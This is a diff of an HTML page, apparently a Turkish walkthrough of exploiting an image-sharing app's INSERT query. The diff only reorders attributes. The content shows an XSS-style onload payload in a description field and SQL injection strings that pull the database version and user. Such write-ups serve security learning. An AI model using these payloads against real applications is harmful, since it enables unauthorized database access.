@@ -75,24 +75,24 @@
 </span>
 </code></pre>
 <p>Hatalı sorgu böyle imiş</p>
-<pre lang="sql" style="background-color:#fdf6e3;"><code>
+<pre style="background-color:#fdf6e3;" lang="sql"><code>
 <span style="color:#859900;">INSERT INTO </span><span style="color:#839496;">`</span><span style="color:#2aa198;">image_shares</span><span style="color:#839496;">`</span><span style="color:#657b83;"> (</span><span style="color:#839496;">`</span><span style="color:#2aa198;">owner</span><span style="color:#839496;">`</span><span style="color:#657b83;">, </span><span style="color:#839496;">`</span><span style="color:#2aa198;">description</span><span style="color:#839496;">`</span><span style="color:#657b83;">, </span><span style="color:#839496;">`</span><span style="color:#2aa198;">image_link</span><span style="color:#839496;">`</span><span style="color:#657b83;">, </span><span style="color:#839496;">`</span><span style="color:#2aa198;">approved</span><span style="color:#839496;">`</span><span style="color:#657b83;">) </span><span style="color:#859900;">VALUES</span><span style="color:#657b83;"> (</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">dbid:AADOGQcBF7RoeEkQStxbhg0Yl1mAi2OF08s</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">lorem&quot; onload=&quot;eval(</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">debugger;</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">)</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">https://www.dropbox.com/s/yleez65273ydx20/xss.jpeg?dl=0&amp;raw=1</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">0</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">)
 </span>
 </code></pre>
 <p>Sorgunun normal halini çıkarttık</p>
-<pre lang="sql" style="background-color:#fdf6e3;"><code>
+<pre style="background-color:#fdf6e3;" lang="sql"><code>
 <span style="color:#859900;">INSERT INTO </span><span style="color:#839496;">`</span><span style="color:#2aa198;">image_shares</span><span style="color:#839496;">`</span><span style="color:#657b83;"> (</span><span style="color:#839496;">`</span><span style="color:#2aa198;">owner</span><span style="color:#839496;">`</span><span style="color:#657b83;">, </span><span style="color:#839496;">`</span><span style="color:#2aa198;">description</span><span style="color:#839496;">`</span><span style="color:#657b83;">, </span><span style="color:#839496;">`</span><span style="color:#2aa198;">image_link</span><span style="color:#839496;">`</span><span style="color:#657b83;">, </span><span style="color:#839496;">`</span><span style="color:#2aa198;">approved</span><span style="color:#839496;">`</span><span style="color:#657b83;">) </span><span style="color:#859900;">VALUES</span><span style="color:#657b83;"> (</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">dbid:$owner</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">$description</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">$image_link</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">0</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">)
 </span>
 </code></pre>
 <p>Artık <strong>SQL injection</strong> yapabiliriz.</p>
 <p>Versiyon bilgisini alalım ilk olarak</p>
-<pre lang="sql" style="background-color:#fdf6e3;"><code>
+<pre style="background-color:#fdf6e3;" lang="sql"><code>
 <span style="color:#657b83;">test</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">,(select version()),</span><span style="color:#839496;">&#39;</span><span style="color:#6c71c4;">0</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">);#
 </span>
 </code></pre>
 <p><img src="6.png" alt="" /></p>
 <p>Sonra kullanıcı bilgisini</p>
-<pre style="background-color:#fdf6e3;" lang="sql"><code>
+<pre lang="sql" style="background-color:#fdf6e3;"><code>
 <span style="color:#657b83;">aciklama</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">,(select user()),</span><span style="color:#839496;">&#39;</span><span style="color:#6c71c4;">0</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">);#
 </span>
 </code></pre>
